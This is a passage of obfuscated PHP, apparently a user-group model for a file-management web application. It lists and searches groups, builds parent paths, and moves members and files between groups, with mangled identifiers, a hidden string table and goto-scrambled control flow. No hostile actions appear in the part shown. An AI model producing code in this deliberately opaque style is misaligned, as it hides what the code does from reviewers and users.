$D·Å¦´Şš =& $_SERVER[´¬]; $E°µŠ‡‘ñ¯ = array(); foreach ($AŠÀœ‘‰ÊÔ as $dîÅ¶âğØÛ => $BÓÀÃ¬Ã¦) { $E°µŠ‡‘ñ¯[] = array($D·Å¦´Şš[1689], $BÓÀÃ¬Ã¦, $D·Å¦´Şš[1712], $dîÅ¶âğØÛ + 1); } $this->saveAll($E°µŠ‡‘ñ¯); } public function listData() { $dò‹Ï™Â = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dò‹Ï™Â[$_SERVER[´¬][366]]); return $dò‹Ï™Â; } private function _makeOrder($bÖó²—È ‚ = '') { goto BËßŒ‚øè±; BËßŒ‚øè±: $CÉé†ğİ¡Ä =& $_SERVER[´¬]; $dùºŒèƒŠ´ = array($CÉé†ğİ¡Ä[1689], $CÉé†ğİ¡Ä[28], $CÉé†ğİ¡Ä[1675], $CÉé†ğİ¡Ä[193]); $dä§øÉ‹’ = array($CÉé†ğİ¡Ä[426] => $CÉé†ğİ¡Ä[427], $CÉé†ğİ¡Ä[428] => $CÉé†ğİ¡Ä[429]); goto fï¥å½·Ğ; fï¥å½·Ğ: $Cò““¢ç» = Input::get($CÉé†ğİ¡Ä[433], $CÉé†ğİ¡Ä[7], $CÉé†ğİ¡Ä[1693], $dùºŒèƒŠ´); $CºˆÕİƒØ¹ = Input::get($CÉé†ğİ¡Ä[434], $CÉé†ğİ¡Ä[7], $CÉé†ğİ¡Ä[1771], array($CÉé†ğİ¡Ä[1771], $CÉé†ğİ¡Ä[428])); $CºˆÕİƒØ¹ = $dä§øÉ‹’[$CºˆÕİƒØ¹]; goto cóæ†ï›; cóæ†ï›: $bÖó²—È ‚ = $bÖó²—È ‚ . "{$Cò““¢ç»}\x20{$CºˆÕİƒØ¹}\x2c\x20\x67\162\157\165\160\111\x44\40\141\x73\143"; return $this->order($bÖó²—È ‚); goto f˜ÍßâÖ²; f˜ÍßâÖ²: } public function listChild($D£ö´å§) { $eİø¯¾êÎë =& $_SERVER[´¬]; $DæÓàìÍİ = $this->where(array($eİø¯¾êÎë[476] => $D£ö´å§))->_makeOrder()->selectPage(200); $this->_listDataApply($DæÓàìÍİ[$eİø¯¾êÎë[366]]); return $DæÓàìÍİ; } public function listByID($C¼ÉÇÆÓæÖ) { $cª”£¿£ã =& $_SERVER[´¬]; if (!$C¼ÉÇÆÓæÖ) { return array(); } $fŠøÁİìŠ§ = array($cª”£¿£ã[1689] => array($cª”£¿£ã[7], $C¼ÉÇÆÓæÖ)); $f’ºœÖª† = $this->where($fŠøÁİìŠ§)->select(); $this->_listDataApply($f’ºœÖª†); return $f’ºœÖª†; } public function listSearch($eŒâ‘¦òØÎ) { goto BÒ½ÈÙ; dÌŠŒ«ˆ: if ($bèİ¥²ëÉ) { $BÈà§ÏƒÜ = $this->getInfoSimple($bèİ¥²ëÉ); $aŠ•„Ó¼¦ = $BÈà§ÏƒÜ[$aíÇ¶öÛï½[485]] . $bèİ¥²ëÉ . $aíÇ¶öÛï½[512]; $eÇÉÊòæ = array($eÇÉÊòæ, array($aíÇ¶öÛï½[485] => array($aíÇ¶öÛï½[379], $aŠ•„Ó¼¦))); } $eÇÉÊòæ = $this->parseWhereLike($eÇÉÊòæ); $cîÓ¼Ñ½Ìâ = $this->_makeOrder()->where($eÇÉÊòæ)->selectPage(20); goto D¢©ƒˆöæ‘; fÓ÷÷³“ˆÙ: return $cîÓ¼Ñ½Ìâ; goto a¿Ÿö²Â; EÈßŒØÏ´: if (!trim($CÀŸêˆÅíï)) { return !1; } $CÀŸêˆÅíï = str_replace($aíÇ¶öÛï½[1774], $aíÇ¶öÛï½[1775], $CÀŸêˆÅíï); $eÇÉÊòæ = array($aíÇ¶öÛï½[1689] => array($aíÇ¶öÛï½[379], "{$CÀŸêˆÅíï}\45"), $aíÇ¶öÛï½[28] => array($aíÇ¶öÛï½[379], "\45{$CÀŸêˆÅíï}\x25"), $aíÇ¶öÛï½[958] => $aíÇ¶öÛï½[1776]); goto dÌŠŒ«ˆ; D¢©ƒˆöæ‘: $cîÓ¼Ñ½Ìâ = $cîÓ¼Ñ½Ìâ ? $cîÓ¼Ñ½Ìâ : array($aíÇ¶öÛï½[366] => array(), $aíÇ¶öÛï½[363] => array()); if (!$cîÓ¼Ñ½Ìâ || count($cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[366]]) < 5 && Input::check($CÀŸêˆÅíï, $aíÇ¶öÛï½[315])) { goto d¹¦§‚éÙÅ; B÷î¾ÆÅ¦°: $a¹×¥Ä ˜ì = array_merge($dŞ ¥ô­³÷, $B³ùšÁÂ, $cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[366]]); $cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[366]] = array_unique_by_key($a¹×¥Ä ˜ì, $aíÇ¶öÛï½[1689]); $cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[363]][$aíÇ¶öÛï½[364]] = count($cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[366]]); goto d´ÂÉÃ¬îï; d´ÂÉÃ¬îï: $cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[363]][$aíÇ¶öÛï½[365]] = ceil($cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[363]][$aíÇ¶öÛï½[364]] / $cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[363]][$aíÇ¶öÛï½[360]]); goto Dø›¼œŸá; d¹¦§‚éÙÅ: $aì¢˜¥«©ª = $this->groupChildrenAll($bèİ¥²ëÉ); $dŞ ¥ô­³÷ = $this->_searchFromMeta($aíÇ¶öÛï½[441], $CÀŸêˆÅíï, 10, $aì¢˜¥«©ª); $B³ùšÁÂ = $this->_searchFromMeta($aíÇ¶öÛï½[442], $CÀŸêˆÅíï, 10, $aì¢˜¥«©ª); goto B÷î¾ÆÅ¦°; Dø›¼œŸá: } $this->_listDataApply($cîÓ¼Ñ½Ìâ[$aíÇ¶öÛï½[366]]); goto fÓ÷÷³“ˆÙ; BÒ½ÈÙ: $aíÇ¶öÛï½ =& $_SERVER[´¬]; $CÀŸêˆÅíï = $eŒâ‘¦òØÎ[$aíÇ¶öÛï½[1772]]; $bèİ¥²ëÉ = isset($eŒâ‘¦òØÎ[$aíÇ¶öÛï½[1773]]) ? $eŒâ‘¦òØÎ[$aíÇ¶öÛï½[1773]] : !1; goto EÈßŒØÏ´; a¿Ÿö²Â: } protected function groupChildrenAll($fè‡¥ß–´¥) { $c¥Çİâç¸è =& $_SERVER[´¬]; if (!$fè‡¥ß–´¥) { return !1; } if (is_string($fè‡¥ß–´¥)) { $fè‡¥ß–´¥ = array($fè‡¥ß–´¥); } $FÍßø„•ò = $fè‡¥ß–´¥; foreach ($fè‡¥ß–´¥ as $Fïô×–õéÑ) { $E‚Ğ®»šÇç = $this->getInfoSimple($Fïô×–õéÑ); $bÚèÛÉµî = array($c¥Çİâç¸è[485] => array($c¥Çİâç¸è[379], $E‚Ğ®»šÇç[$c¥Çİâç¸è[485]] . $Fïô×–õéÑ . $c¥Çİâç¸è[512])); $fâ„ë¢µ®á = $this->field($c¥Çİâç¸è[1689])->where($bÚèÛÉµî)->select(); $FÍßø„•ò = array_merge($FÍßø„•ò, array_to_keyvalue($fâ„ë¢µ®á, $c¥Çİâç¸è[33], $c¥Çİâç¸è[1689])); } return array_unique($FÍßø„•ò); } private function _searchFromMeta($f¬¾ó…À¾ù, $b¬òõƒÕÙ¿, $fùõ¢ó¡Øù, $a…ÎÅ­İ‚) { goto bè÷§˜¿«; dèö¯Œ¡—¨: if (!$aÁ¢êŠÁ£ğ) { return array(); } return $aÁ¢êŠÁ£ğ; goto FêÄø¥å™; E‘ÅñÇŒê¬: $eß‘“¹øì’ = $this->parseWhereLike($eß‘“¹øì’); if ($a…ÎÅ­İ‚) { $eß‘“¹øì’[$F“Ãë°„İİ[1689]] = array($F“Ãë°„İİ[7], $a…ÎÅ­İ‚); } $CÛÌ†á‹¶ = Model($F“Ãë°„İİ[1777])->where($eß‘“¹øì’)->limit($fùõ¢ó¡Øù)->select(); goto Cˆ¾ŞŸåÓ; Cˆ¾ŞŸåÓ: if (!$CÛÌ†á‹¶) { return array(); } $CÛÌ†á‹¶ = array_to_keyvalue($CÛÌ†á‹¶, $F“Ãë°„İİ[33], $F“Ãë°„İİ[1689]); $aÁ¢êŠÁ£ğ = $this->where(array($F“Ãë°„İİ[1767] => array($F“Ãë°„İİ[7], $CÛÌ†á‹¶)))->select(); goto dèö¯Œ¡—¨; bè÷§˜¿«: $F“Ãë°„İİ =& $_SERVER[´¬]; $b¬òõƒÕÙ¿ = strtolower($b¬òõƒÕÙ¿); $eß‘“¹øì’ = array($F“Ãë°„İİ[93] => $f¬¾ó…À¾ù, $F“Ãë°„İİ[371] => array($F“Ãë°„İİ[379], "\45{$b¬òõƒÕÙ¿}\x25")); goto E‘ÅñÇŒê¬; FêÄø¥å™: } protected function _listDataApplyItem($e¶®ò£·î›) { $D×Ô¬‰æ£Ä = array($e¶®ò£·î›); $this->_listDataApply($D×Ô¬‰æ£Ä); return $D×Ô¬‰æ£Ä[0]; } protected function _listDataApply(&$EÛ¥î«Š¤¿) { goto a¹Šâ«´Ï; cæ±©îÔ‘Ã: $this->_listAppendParent($EÛ¥î«Š¤¿); $this->_listAppendSourceRoot($EÛ¥î«Š¤¿, $bŠ‹‚‰é™Š); goto A¼²µñŸ; BÑ°‚Ü„œ: $this->_listAppendChildren($EÛ¥î«Š¤¿); $this->_listAppendChildrenMember($EÛ¥î«Š¤¿); $this->_listAppendMeta($EÛ¥î«Š¤¿, $bŠ‹‚‰é™Š); goto cæ±©îÔ‘Ã; a¹Šâ«´Ï: $f¹’ ‡Ô¤¾ =& $_SERVER[´¬]; if (!$EÛ¥î«Š¤¿) { return; } $bŠ‹‚‰é™Š = array_to_keyvalue($EÛ¥î«Š¤¿, $f¹’ ‡Ô¤¾[33], $f¹’ ‡Ô¤¾[1689]); goto BÑ°‚Ü„œ; A¼²µñŸ: } private function _listAppendChildren(&$bäö¡…²Œ) { goto f›˜ºâ˜Ôø; F‚Ä¾è­: $d´†ôì½ã… = array($eö–ßñÄÑñ[476], $eö–ßñÄÑñ[1778] => $eö–ßñÄÑñ[478]); $FÓà›²ùî = $this->field($d´†ôì½ã…)->where($Eš¦Ã…°ôğ)->group($eö–ßñÄÑñ[476])->select(); $A·ó‡‰õ‡ä = array_to_keyvalue($FÓà›²ùî, $eö–ßñÄÑñ[476], $eö–ßñÄÑñ[478]); goto D¥†õì¶±µ; f›˜ºâ˜Ôø: $eö–ßñÄÑñ =& $_SERVER[´¬]; $dØñŒŒà´† = array_to_keyvalue($bäö¡…²Œ, $eö–ßñÄÑñ[33], $eö–ßñÄÑñ[1689]); $Eš¦Ã…°ôğ = array($eö–ßñÄÑñ[476] => array($eö–ßñÄÑñ[7], $dØñŒŒà´†)); goto F‚Ä¾è­; D¥†õì¶±µ: foreach ($bäö¡…²Œ as &$eƒ±´ñ»‘×) { $b–£ã¯ÄÔ = $eƒ±´ñ»‘×[$eö–ßñÄÑñ[1689]]; $eƒ±´ñ»‘×[$eö–ßñÄÑñ[1779]] = isset($A·ó‡‰õ‡ä[$b–£ã¯ÄÔ]) ? intval($A·ó‡‰õ‡ä[$b–£ã¯ÄÔ]) : !1; } unset($eƒ±´ñ»‘×); goto C¹„…‹ñ‰”; C¹„…‹ñ‰”: } private function _listAppendChildrenMember(&$Fè•¦èøªÔ) { goto AÒÄğÓÍ¯É; C£¯–¸ºá: $BîõÉñİ¾å = array($aÖìÔáğ†[1689], $aÖìÔáğ†[1778] => $aÖìÔáğ†[478]); $E÷Â†¸¦Å‰ = Model($aÖìÔáğ†[1770])->field($BîõÉñİ¾å)->where($bö šèÆ‰é)->group($aÖìÔáğ†[1689])->select(); $EØÀåîŠÜ‰ = array_to_keyvalue($E÷Â†¸¦Å‰, $aÖìÔáğ†[1689], $aÖìÔáğ†[478]); goto Bï—÷Û¯„; AÒÄğÓÍ¯É: $aÖìÔáğ† =& $_SERVER[´¬]; $a“­ôª˜Ç = array_to_keyvalue($Fè•¦èøªÔ, $aÖìÔáğ†[33], $aÖìÔáğ†[1689]); $bö šèÆ‰é = array($aÖìÔáğ†[1689] => array($aÖìÔáğ†[7], $a“­ôª˜Ç)); goto C£¯–¸ºá; Bï—÷Û¯„: foreach ($Fè•¦èøªÔ as &$d„…¹Á•µ) { $cÛ­•ÕŸ£¤ = $d„…¹Á•µ[$aÖìÔáğ†[1689]]; $d„…¹Á•µ[$aÖìÔáğ†[1780]] = isset($EØÀåîŠÜ‰[$cÛ­•ÕŸ£¤]) ? intval($EØÀåîŠÜ‰[$cÛ­•ÕŸ£¤]) : !1; } unset($d„…¹Á•µ); goto E¼´‘ïâê„; E¼´‘ïâê„: } private function _listAppendMeta(&$D²µä‡ÌÛ‚, $eÅéé«¥Õ­) { goto bÄ‰¥µÌ”Ë; bÄ‰¥µÌ”Ë: $a¹›çÈ®”Æ =& $_SERVER[´¬]; $a¸°ÔšÜ§„ = array($a¹›çÈ®”Æ[1689] => array($a¹›çÈ®”Æ[7], $eÅéé«¥Õ­)); $E¶—Ì‘À … = Model($a¹›çÈ®”Æ[1769])->where($a¸°ÔšÜ§„)->select(); goto cÏš¸‹Õé‘; fÀà³“›ì: foreach ($D²µä‡ÌÛ‚ as &$Dº…¶äçì) { $Dº…¶äçì[$a¹›çÈ®”Æ[443]] = array(); if (isset($E¶—Ì‘À …[$Dº…¶äçì[$a¹›çÈ®”Æ[1689]]])) { $Dº…¶äçì[$a¹›çÈ®”Æ[443]] = $E¶—Ì‘À …[$Dº…¶äçì[$a¹›çÈ®”Æ[1689]]]; } } unset($Dº…¶äçì); goto Dš×ƒ‹£; cÏš¸‹Õé‘: $E¶—Ì‘À … = array_to_keyvalue_group($E¶—Ì‘À …, $a¹›çÈ®”Æ[1689]); foreach ($E¶—Ì‘À … as &$EªáÓôó²†) { $EªáÓôó²† = array_to_keyvalue($EªáÓôó²†, $a¹›çÈ®”Æ[93], $a¹›çÈ®”Æ[371]); } unset($EªáÓôó²†); goto fÀà³“›ì; Dš×ƒ‹£: } protected function parentLevelArray($d¸·‰Š Ü) { $aæİ‡¿šï‘ =& $_SERVER[´¬]; $d¸·‰Š Ü = explode($aæİ‡¿šï‘[47], trim($d¸·‰Š Ü, $aæİ‡¿šï‘[47])); $d¸·‰Š Ü = array_remove_value($d¸·‰Š Ü, $aæİ‡¿šï‘[495]); return $d¸·‰Š Ü; } private function _listAppendParent(&$C®Ç¸·Ğê§) { goto bÎ¾«İ›ô«; bô¶“Û ›ˆ: unset($cìß‚Î·¸Ë); foreach ($b©°‹¼î„ø as $bŸ•Ğô—è => $Eğ¨Â¿…ğ•) { if ($Eğ¨Â¿…ğ•) { continue; } $EÆ‡¿Š§Ó = $this->getInfoSimple($bŸ•Ğô—è); $b©°‹¼î„ø[$bŸ•Ğô—è] = $EÆ‡¿Š§Ó[$bƒ“Î³’î¬[28]]; } $aØ˜Åá¹¨Í = $GLOBALS[$bƒ“Î³’î¬[6]][$bƒ“Î³’î¬[88]][$bƒ“Î³’î¬[1781]]; goto F‹ºÓ¯´óÁ; F‹ºÓ¯´óÁ: if ($GLOBALS[$bƒ“Î³’î¬[483]] == $bƒ“Î³’î¬[87]) { $aØ˜Åá¹¨Í = !1; } foreach ($C®Ç¸·Ğê§ as &$cìß‚Î·¸Ë) { $fœ­±˜” É = $this->parentLevelArray($cìß‚Î·¸Ë[$bƒ“Î³’î¬[485]]); $AïÜåçØ » = $bƒ“Î³’î¬[33]; foreach ($fœ­±˜” É as $bŸ•Ğô—è => $EŠæğ†Û§) { if ($aØ˜Åá¹¨Í && $bŸ•Ğô—è == 0) { continue; } $AïÜåçØ » .= $b©°‹¼î„ø[$EŠæğ†Û§] . $bƒ“Î³’î¬[8]; } if ($fœ­±˜” É) { $AïÜåçØ » .= $cìß‚Î·¸Ë[$bƒ“Î³’î¬[28]]; } $cìß‚Î·¸Ë[$bƒ“Î³’î¬[489]] = str_replace($bƒ“Î³’î¬[494], $bƒ“Î³’î¬[8], $AïÜåçØ »); } unset($cìß‚Î·¸Ë); goto Cæ×ŞÎØç¼; bÎ¾«İ›ô«: $bƒ“Î³’î¬ =& $_SERVER[´¬]; $b©°‹¼î„ø = array(); foreach ($C®Ç¸·Ğê§ as &$cìß‚Î·¸Ë) { $b©°‹¼î„ø[$cìß‚Î·¸Ë[$bƒ“Î³’î¬[1689]]] = $cìß‚Î·¸Ë[$bƒ“Î³’î¬[28]]; $fœ­±˜” É = $this->parentLevelArray($cìß‚Î·¸Ë[$bƒ“Î³’î¬[485]]); foreach ($fœ­±˜” É as $EŠæğ†Û§) { if (!isset($b©°‹¼î„ø[$EŠæğ†Û§])) { $b©°‹¼î„ø[$EŠæğ†Û§] = 0; } } } goto bô¶“Û ›ˆ; Cæ×ŞÎØç¼: } private function _listAppendSourceRoot(&$aˆñ×Ãµ¤¯, $a¥„àÍŞ÷’) { goto fŠ Û÷á£; fŠ Û÷á£: $dˆ¶Š¾Ü¶ =& $_SERVER[´¬]; $F—”¦ó†´Ä = array($dˆ¶Š¾Ü¶[402] => SourceModel::TYPE_GROUP, $dˆ¶Š¾Ü¶[476] => 0, $dˆ¶Š¾Ü¶[482] => array($dˆ¶Š¾Ü¶[7], $a¥„àÍŞ÷’)); $eÒ‹ŞÇçÔğ = $dˆ¶Š¾Ü¶[1782]; goto cİØ˜ÙÚéà; c‘¨£ÃÈÃ: foreach ($aˆñ×Ãµ¤¯ as &$d‹Öâ¦ÊèÃ) { $d‹Öâ¦ÊèÃ[$dˆ¶Š¾Ü¶[85]] = $F¨µŠ±â­é[$d‹Öâ¦ÊèÃ[$dˆ¶Š¾Ü¶[1689]]] ? $F¨µŠ±â­é[$d‹Öâ¦ÊèÃ[$dˆ¶Š¾Ü¶[1689]]] : array(); } unset($d‹Öâ¦ÊèÃ); goto FÁ‚Ú¶¦Œ†; cİØ˜ÙÚéà: $F¨µŠ±â­é = Model($dˆ¶Š¾Ü¶[790])->order($dˆ¶Š¾Ü¶[1783])->field($eÒ‹ŞÇçÔğ)->where($F—”¦ó†´Ä)->select(); $F¨µŠ±â­é = array_to_keyvalue($F¨µŠ±â­é, $dˆ¶Š¾Ü¶[482]); $F¨µŠ±â­é = array_remove_key($F¨µŠ±â­é, $dˆ¶Š¾Ü¶[482]); goto c‘¨£ÃÈÃ; FÁ‚Ú¶¦Œ†: } protected function groupMerge($d¸­ê¨–) { $d¸­ê¨– = array_values(array_unique($d¸­ê¨–)); $e‹êÓªÙ¥é = array(); for ($EŒÃÆ–¤†é = 0; $EŒÃÆ–¤†é < count($d¸­ê¨–); $EŒÃÆ–¤†é++) { $B¤’°Íï¬‹ = !1; for ($b·Šë¦ËÕ = 0; $b·Šë¦ËÕ < count($d¸­ê¨–); $b·Šë¦ËÕ++) { if ($EŒÃÆ–¤†é == $b·Šë¦ËÕ) { continue; } if ($this->isParentOf($d¸­ê¨–[$b·Šë¦ËÕ], $d¸­ê¨–[$EŒÃÆ–¤†é])) { $B¤’°Íï¬‹ = !0; break; } } if (!$B¤’°Íï¬‹) { $e‹êÓªÙ¥é[] = $d¸­ê¨–[$EŒÃÆ–¤†é]; } } return $e‹êÓªÙ¥é; } protected function isParentOf($Fš÷ôÔ‚„, $eÛ÷³Ô¹Ğ¿) { goto EòÎÃñ‡Ÿ‡; EòÎÃñ‡Ÿ‡: $DÇ‰Ò…·Â =& $_SERVER[´¬]; if (!$Fš÷ôÔ‚„ || !$eÛ÷³Ô¹Ğ¿ || $Fš÷ôÔ‚„ == $eÛ÷³Ô¹Ğ¿) { return !1; } $d“‚õ¯ïÁ = $this->getInfoSimple($Fš÷ôÔ‚„); goto f‚æç½ÁÆ‘; DëŞ…Å­¹›: return !1; goto cÏÂõÌ®œ÷; f‚æç½ÁÆ‘: $DÊà‹Ñ¨ë = $this->getInfoSimple($eÛ÷³Ô¹Ğ¿); $AÁÁ¥â»•ğ = $d“‚õ¯ïÁ[$DÇ‰Ò…·Â[485]] . $Fš÷ôÔ‚„ . $DÇ‰Ò…·Â[47]; if (substr($DÊà‹Ñ¨ë[$DÇ‰Ò…·Â[485]], 0, strlen($AÁÁ¥â»•ğ)) == $AÁÁ¥â»•ğ) { return !0; } goto DëŞ…Å­¹›; cÏÂõÌ®œ÷: } public function groupShowRoot($f—Œ‰ŒŞĞÓ, $aí‰ğÙãß = false) { goto aÈ¢‚Ö; AŸÚÛò³ÀÓ: if ($aí‰ğÙãß && count($eËìÁìùå¦) == 1) { return $c¦ŞÀÙéé; } if (!$bó«ôÏ¿Ä›[$e½³å«Î[443]] || !isset($bó«ôÏ¿Ä›[$e½³å«Î[443]][$e½³å«Î[1765]]) || $bó«ôÏ¿Ä›[$e½³å«Î[443]][$e½³å«Î[1765]] == $e½³å«Î[1739]) { return $this->groupShowRoot($eËìÁìùå¦[count($eËìÁìùå¦) - 1], $aí‰ğÙãß); } if ($bó«ôÏ¿Ä›[$e½³å«Î[443]][$e½³å«Î[1765]] == $e½³å«Î[356]) { $dˆîÅ³´‘Š = explode($e½³å«Î[47], $bó«ôÏ¿Ä›[$e½³å«Î[443]][$e½³å«Î[1766]]); if ($dˆîÅ³´‘Š) { $c¦ŞÀÙéé = array_merge($c¦ŞÀÙéé, $dˆîÅ³´‘Š); } } goto fÂ³«°½‚Š; cŸ‡ßš¼†…: $eËìÁìùå¦ = $this->parentLevelArray($bó«ôÏ¿Ä›[$e½³å«Î[485]]); $c¦ŞÀÙéé = array($f—Œ‰ŒŞĞÓ); if (count($eËìÁìùå¦) == 0) { return $c¦ŞÀÙéé; } goto AŸÚÛò³ÀÓ; aÈ¢‚Ö: $e½³å«Î =& $_SERVER[´¬]; $bó«ôÏ¿Ä› = $this->getInfo($f—Œ‰ŒŞĞÓ); if (!$bó«ôÏ¿Ä›) { return array(); } goto cŸ‡ßš¼†…; fÂ³«°½‚Š: return $c¦ŞÀÙéé; goto E×ï¾á£¥; E×ï¾á£¥: } protected function resetParentLevel() { $E©Ú’¡ºŒ¶ =& $_SERVER[´¬]; $f‹’¤Š™Û = $E©Ú’¡ºŒ¶[1689]; $E¨Õ„ĞäãÂ = $this->select(); $E¨Õ„ĞäãÂ = array_to_keyvalue($E¨Õ„ĞäãÂ, $f‹’¤Š™Û); foreach ($E¨Õ„ĞäãÂ as $CÒªÂØ¢) { goto DŒã½ŒÜ˜à; CĞ£¿„î Ò: $b¯¯ì¯ô…Ò[] = 0; $b¯¯ì¯ô…Ò = $E©Ú’¡ºŒ¶[47] . implode($E©Ú’¡ºŒ¶[47], array_reverse($b¯¯ì¯ô…Ò)) . $E©Ú’¡ºŒ¶[47]; $this->setNamePinyin($CÒªÂØ¢[$f‹’¤Š™Û], $CÒªÂØ¢[$E©Ú’¡ºŒ¶[28]]); goto Bùé±‘Æõà; Bùé±‘Æõà: $this->where(array($f‹’¤Š™Û => $CÒªÂØ¢[$f‹’¤Š™Û]))->save(array($E©Ú’¡ºŒ¶[552] => $b¯¯ì¯ô…Ò)); goto Cªëæ“¦¶; DŒã½ŒÜ˜à: $bÜÕĞï—ˆì = $CÒªÂØ¢; $b¯¯ì¯ô…Ò = array(); while ($bÜÕĞï—ˆì[$E©Ú’¡ºŒ¶[476]] != 0) { $b¯¯ì¯ô…Ò[] = $bÜÕĞï—ˆì[$E©Ú’¡ºŒ¶[476]]; $bÜÕĞï—ˆì = $E¨Õ„ĞäãÂ[$bÜÕĞï—ˆì[$E©Ú’¡ºŒ¶[476]]]; } goto CĞ£¿„î Ò; Cªëæ“¦¶: } return $E¨Õ„ĞäãÂ; } public function groupNameAuto($B‘·£‡“ç¸, $a‚Ç‡™ˆÌæ) { $f”•ğã‹øá =& $_SERVER[´¬]; $F»ß«íì— = $this->where(array($f”•ğã‹øá[393] => $B‘·£‡“ç¸))->getField($f”•ğã‹øá[28], !0); if (!$F»ß«íì— || !in_array($a‚Ç‡™ˆÌæ, $F»ß«íì—)) { return $a‚Ç‡™ˆÌæ; } for ($b¯Íªîïæ = 1; $b¯Íªîïæ <= count($F»ß«íì—) + 1; $b¯Íªîïæ++) { $fÉæ¨”¾ƒá = $a‚Ç‡™ˆÌæ . "\50{$b¯Íªîïæ}\51"; if (!in_array($fÉæ¨”¾ƒá, $F»ß«íì—)) { return $fÉæ¨”¾ƒá; } } } public function groupSwitch($AŞ—çîŒï, $F«àƒŠ¦Â) { goto Fœ°‰ªÉ¬Ç; C¹ğàŸ’›ñ: $Fò‹™š…ì = array_to_keyvalue($Fò‹™š…ì, $eƒÏ‘•¨‹µ[1689]); if (!isset($Fò‹™š…ì[$AŞ—çîŒï]) || !isset($Fò‹™š…ì[$F«àƒŠ¦Â]) || $Fò‹™š…ì[$AŞ—çîŒï][$eƒÏ‘•¨‹µ[476]] == 0) { return !1; } $AéŒ°›‹¹ = array($eƒÏ‘•¨‹µ[1689] => $AŞ—çîŒï); goto Få³ËòœĞ; Få³ËòœĞ: $E†ÕæŒø = Model($eƒÏ‘•¨‹µ[1770])->where($AéŒ°›‹¹)->select(); if (!$E†ÕæŒø) { $E†ÕæŒø = array(); } foreach ($E†ÕæŒø as $f™­î‰‘¼¦) { $Cî¥Æ´õ¬ = $f™­î‰‘¼¦[$eƒÏ‘•¨‹µ[1526]]; $AéŒ°›‹¹ = array($eƒÏ‘•¨‹µ[1526] => $Cî¥Æ´õ¬, $eƒÏ‘•¨‹µ[1689] => $F«àƒŠ¦Â); $f²Í½ªª“ = Model($eƒÏ‘•¨‹µ[1770])->where($AéŒ°›‹¹)->find(); if (!$f²Í½ªª“) { $A„¶‰ô²ƒ = array($F«àƒŠ¦Â => $f™­î‰‘¼¦[$eƒÏ‘•¨‹µ[1784]]); Model($eƒÏ‘•¨‹µ[505])->userGroupAdd($Cî¥Æ´õ¬, $A„¶‰ô²ƒ); } Model($eƒÏ‘•¨‹µ[505])->userGroupRemove($Cî¥Æ´õ¬, $AŞ—çîŒï); } goto BÕ³¬»–Ì; fæÅ£œ±ƒ: $föÖóñÀõÊ = !empty($AÊ¼à¡„…÷[$AŞ—çîŒï]) ? $AÊ¼à¡„…÷[$AŞ—çîŒï] : !1; if ($föÖóñÀõÊ) { goto BŞÅÇ‹‚„; Bìßà¤­Ï¿: $AÊ¼à¡„…÷ = Model($eƒÏ‘•¨‹µ[790])->where($AéŒ°›‹¹)->field($eƒÏ‘•¨‹µ[1786])->select(); if (!$AÊ¼à¡„…÷) { $AÊ¼à¡„…÷ = array(); } Model($eƒÏ‘•¨‹µ[790])->moveClearAuth = !1; goto cÕÅ«ÁĞÚ¹; BŞÅÇ‹‚„: if (!$AÊ¼à¡„…÷[$F«àƒŠ¦Â]) { $AÊ¼à¡„…÷[$F«àƒŠ¦Â] = Model($eƒÏ‘•¨‹µ[790])->groupRootAdd($F«àƒŠ¦Â); } $aç†¬Œßœ = $AÊ¼à¡„…÷[$F«àƒŠ¦Â]; $AéŒ°›‹¹ = array($eƒÏ‘•¨‹µ[476] => $föÖóñÀõÊ); goto Bìßà¤­Ï¿; cÕÅ«ÁĞÚ¹: foreach ($AÊ¼à¡„…÷ as $f›î³ÑÉ•) { $A†œ„™·¹ = $f›î³ÑÉ•[$eƒÏ‘•¨‹µ[401]] == $eƒÏ‘•¨‹µ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($eƒÏ‘•¨‹µ[790])->move($f›î³ÑÉ•[$eƒÏ‘•¨‹µ[394]], $aç†¬Œßœ, $A†œ„™·¹); } Model($eƒÏ‘•¨‹µ[790])->moveClearAuth = !0; $AéŒ°›‹¹ = array($eƒÏ‘•¨‹µ[402] => 2, $eƒÏ‘•¨‹µ[482] => $AŞ—çîŒï); goto aîÂ¼ÄÇê; aîÂ¼ÄÇê: $BÀ‹á‰ôë… = array($eƒÏ‘•¨‹µ[482] => $F«àƒŠ¦Â); Model($eƒÏ‘•¨‹µ[1787])->where($AéŒ°›‹¹)->save($BÀ‹á‰ôë…); Model($eƒÏ‘•¨‹µ[1788])->where($AéŒ°›‹¹)->save($BÀ‹á‰ôë…); goto eÂ©¡’†¬«; eÂ©¡’†¬«: } $this->_changeChildLevel($Fò‹™š…ì[$AŞ—çîŒï], $Fò‹™š…ì[$F«àƒŠ¦Â], !0); goto F©´–Ùâ”; Fœ°‰ªÉ¬Ç: $eƒÏ‘•¨‹µ =& $_SERVER[´¬]; $AéŒ°›‹¹ = array($eƒÏ‘•¨‹µ[1689] => array($eƒÏ‘•¨‹µ[7], array($AŞ—çîŒï, $F«àƒŠ¦Â))); $Fò‹™š…ì = $this->where($AéŒ°›‹¹)->select(); goto C¹ğàŸ’›ñ; F©´–Ùâ”: $this->where(array($eƒÏ‘•¨‹µ[476] => $AŞ—çîŒï))->save(array($eƒÏ‘•¨‹µ[476] => $F«àƒŠ¦Â)); return !0; goto a‚‚ˆØÉ¿; BÕ³¬»–Ì: $AéŒ°›‹¹ = array($eƒÏ‘•¨‹µ[402] => 2, $eƒÏ‘•¨‹µ[476] => 0, $eƒÏ‘•¨‹µ[401] => 1, $eƒÏ‘•¨‹µ[482] => array($eƒÏ‘•¨‹µ[7], array($AŞ—çîŒï, $F«àƒŠ¦Â))); $AÊ¼à¡„…÷ = Model($eƒÏ‘•¨‹µ[790])->where($AéŒ°›‹¹)->field($eƒÏ‘•¨‹µ[1785])->select(); $AÊ¼à¡„…÷ = array_to_keyvalue($AÊ¼à¡„…÷, $eƒÏ‘•¨‹µ[482], $eƒÏ‘•¨‹µ[394]); goto fæÅ£œ±ƒ; a‚‚ˆØÉ¿: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\141\166"; protected function 